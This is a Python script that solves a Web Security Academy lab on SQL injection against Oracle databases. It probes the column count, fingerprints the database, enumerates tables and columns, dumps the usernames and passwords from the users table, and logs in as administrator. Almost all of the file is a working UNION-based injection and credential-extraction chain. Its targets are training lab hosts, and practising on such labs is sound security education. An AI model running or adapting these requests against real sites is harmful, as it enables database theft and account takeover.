import requests
import argparse
import re


parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection attack, listing the database contents on Oracle')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

COLUMNS = 0
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = { 'Cookie': f'session={r.cookies.get("session")}' }

for i in range(27, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='ORDER BY {i}-- ")
    print(f"Checking if table has {i} columns.")
    if not "Internal Server Error" in r.text:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

try:
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}@@version-- ").status_code == 200
    r2 = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}version()-- ").status_code == 200
    if r:
        print("Database is MySQL or Microsoft.")
    elif r2:
        print("Database is PostgreSQL.")
    else:
        print("Database is Oracle")
except:
    print("Error while trying to determine database type.")

# RETRIEVE ALL TABLES AND SEARCH FOR USERS TABLE
r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}TABLE_NAME FROM ALL_TABLES-- ")
users_table = "USERS_" + re.findall(r'USERS_(\w+)', r.text)[1]
print(users_table)
print(f"Found users table: {users_table}")

# RETRIEVE ALL COLUMNS FROM USERS TABLE
r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = '{users_table}'-- ")
user_column = "USERNAME_" + re.search(r'USERNAME_(\w+)', r.text).group(1)
password_column = "PASSWORD_" + re.search(r'PASSWORD_(\w+)', r.text).group(1)
print(f"Found username column: {user_column}")
print(f"Found password column: {password_column}")

# RETRIEVE ALL VALUES FROM FOUND COLUMNS
r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {user_column},{password_column} FROM {users_table}-- ")
usernames = re.findall(r'<th>(.*?)</th>', r.text)
passwords = re.findall(r'<td>(.*?)</td>', r.text)

# PUT VALUES INSIDE DICT, PRINT LOOTED CREDENTIALS
credentials = {k: v for k, v in zip(usernames, passwords)}
print(credentials)

# LOGIN AS ADMINISTRATOR
data = {
    'csrf': f'{csrf}',
    'username': 'administrator',
    'password': f'{credentials.get("administrator")}'
    }

requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
